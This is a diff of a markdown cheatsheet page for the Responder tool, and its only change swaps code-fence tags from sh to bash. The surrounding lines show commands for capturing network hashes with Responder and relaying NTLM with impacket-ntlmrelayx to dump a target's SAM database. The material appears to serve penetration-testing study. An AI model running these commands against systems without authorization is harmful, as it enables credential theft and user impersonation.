@@ -38,7 +38,7 @@ Git clone: https://github.com/lgandx/Responder
 **Cheatsheet:** 
 **Website:** https://github.com/lgandx/Responder
 ## Usage
-```sh
+```bash
 $ python3 Responder.py -I <interface_name>
 $ python3 Responder.py -I eth0
 ```
@@ -48,7 +48,7 @@ Hashes are located in the logs `/usr/share/responder/logs/`, we can crack the ha
 We can also perform a hash relay to impersonate the user with the real server. We can use [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py).
 > Before using these, we need to disable SMB for our responder so we don't intercept our own requests. (`/etc/responder/Responder.conf`)
 
-```sh
+```bash
 # By default it will dump the SAM db
 $ impacket-ntlmrelayx --no-http-server -smb2support -t [target_smb_server]
 
